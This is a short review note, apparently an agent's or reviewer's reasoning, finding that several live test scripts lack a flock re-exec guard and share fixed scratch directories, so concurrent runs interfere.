votes.reasoning: A grep for flock and PB_LIVE_LOCK_HELD finds the re-exec only in credential-store-live (293-297), failure-page-live (539-543), sidecar-origin-gate-live (36-39) and landing-logo-live. browser-agent-live, agent-mark-live, browser-snapshot-live, agent-status-live, no-remote-agent-port-live, service-live and packaged-live mention flock only in header comments. Every flock occurrence in verify-platform.sh is a comment, and the registry rows are plain `node ...` (6766, 6777, 6791, 6877, 6884, 6894, 6895). Fixed scratch paths are confirmed: browser-snapshot-live runs `rmSync(work, recursive)` on .mozbuild/orca-browser-snapshot-live. agent-status-live uses the fixed repo path `join(work,'repo')` and removes it in its finally. service-live removes .mozbuild/orca-service-live/repo at line 296. Two concurrent unlocked runs therefore interfere. The only bar is the stated precondition of two concurrent sessions, which project memory documents as a real condition.
